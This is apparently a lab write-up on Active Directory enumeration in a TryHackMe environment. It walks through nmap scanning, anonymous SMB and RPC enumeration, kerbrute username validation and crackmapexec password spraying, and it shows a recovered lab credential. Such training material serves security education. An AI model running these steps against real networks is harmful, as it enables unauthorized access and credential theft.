# 🔐 Active Directory Basic Enumeration

> A beginner-friendly practical guide to Active Directory enumeration covering network discovery, SMB, LDAP, Kerberos, and password spraying.

---

## 🚀 Introduction

Active Directory enumeration is the foundation of internal penetration testing. Without credentials, attackers rely on misconfigurations to gather information about users, services, and the domain.

---

## 🌐 Step 1: Host Discovery

We start by identifying live systems in the subnet:

```bash
fping -agq 10.211.11.0/24

🔍 Observation
10.211.11.10 → Domain Controller
10.211.11.20 → Workstation

🔎 Step 2: Port Scanning

🔹 Full Port Scan

nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt

🔹 Service Enumeration

nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10

🔍 Key Findings

88 → Kerberos
389 → LDAP
445 → SMB

👉 Confirms Active Directory environment

🔹 Domain Identification

👉 Domain identified as:

tryhackme.loc

📂 Step 3: SMB Enumeration

🔹 Listing Shares

smbclient -L //10.211.11.10 -N

🔹 Checking Permissions

smbmap -H 10.211.11.10

🔍 Interesting Shares

AnonShare
SharedFiles
UserBackups

🔹 Accessing Shares

📁 SharedFiles

👉 Found:

Mouse_and_Malware.txt

📁 UserBackups

👉 Found:

flag.txt
story.txt

🧠 Step 4: User Enumeration

🔹 RPC Enumeration

rpcclient -U "" 10.211.11.10 -N -c "enumdomusers"

👉 Extracted multiple domain users

🔹 Kerberos Enumeration (Kerbrute)

./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt

🔍 Result

Valid usernames identified

Filtered out false positives

🔑 Step 5: Password Policy Enumeration

crackmapexec smb 10.211.11.10 --pass-pol

🔍 Key Findings

Password complexity enabled
Lockout threshold: 10 attempts

👉 Important before password spraying

💣 Step 6: Password Spraying

crackmapexec smb 10.211.11.20 -u users.txt -p pass.txt

✅ Success!

Valid credentials obtained:

rduke : Password1!

🎯 Key Takeaways

Enumeration is the most critical phase in AD attacks
SMB shares can expose sensitive data
LDAP & RPC allow user discovery
Kerbrute helps validate usernames
Password spraying is highly effective

⚠️ Common Mistakes

Ignoring SMB shares
Not validating usernames before spraying
Triggering account lockouts
Running tools without understanding

🏁 Conclusion

This lab demonstrates how attackers can gain valid credentials in an Active Directory environment without any initial access.

By combining:

Network scanning
SMB enumeration
User discovery
Password spraying

👉 We successfully obtained valid credentials.

📌 Author

Cybe07 🚀
